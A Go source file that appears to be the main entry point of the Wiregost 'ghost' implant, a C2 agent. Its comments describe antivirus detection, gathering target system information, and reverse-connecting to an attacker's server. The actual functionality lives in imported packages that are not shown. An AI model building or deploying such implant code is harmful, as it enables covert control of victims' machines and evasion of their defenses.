package main

import (
	"github.com/maxlandon/wiregost/ghost/assets"
	"github.com/maxlandon/wiregost/ghost/channels"
	"github.com/maxlandon/wiregost/ghost/info"
	"github.com/maxlandon/wiregost/ghost/log"
	"github.com/maxlandon/wiregost/ghost/profile"
	"github.com/maxlandon/wiregost/ghost/rpc"
	"github.com/maxlandon/wiregost/ghost/security"
	"github.com/maxlandon/wiregost/ghost/transport"
	"github.com/maxlandon/wiregost/ghost/transport/route"
)

func main() {

	// Core Settings & Security -----------------------------------------------------------------

	// Gather and check all compile-time variables/configuration
	assets.SetupImplantAssets()

	// Init logging
	log.SetupLogging()

	// Implant concurrency management. This function sets the channel map
	// and instantiates/registers the main C2 channel for this implant.
	// It is not ready to be used, and below the communication/RPC insfrastructure
	// will set the stream of this main channel.
	channels.SetupChannels()

	// Various Security checks (antivirus software running, etc)
	security.SetupSecurity()

	// Ghost info, networks available, users connected, env variables
	// Permissions, Owner, OS details, OS specific information.
	info.LoadTargetInformation()

	// Communications & Routing -----------------------------------------------------------------

	// Set network security & credentials
	// Authorisations to connect to listener, fake front pages/redirections
	// credentials, certificates, etc...
	transport.SetupSecurity()

	// Reverse connect or bind listener (goroutine, + send information)
	transport.InitGhostComms()

	// Register RPC services if listener
	rpc.InitGhostRPC()

	// Open routes given by server. Check all security details (fake pages,
	// credentials and authorisations.)
	route.InitRouting()

	// OS-Specific -----------------------------------------------------------------------------

	// Windows: Load and setup all Windows-related objects/functions

	// Other -----------------------------------------------------------------------------------

	// Monitor performance and resource usage, profiling.
	// (Sends reports to server every once in while.) (blocking)
	profile.StartRuntimeControl()
}
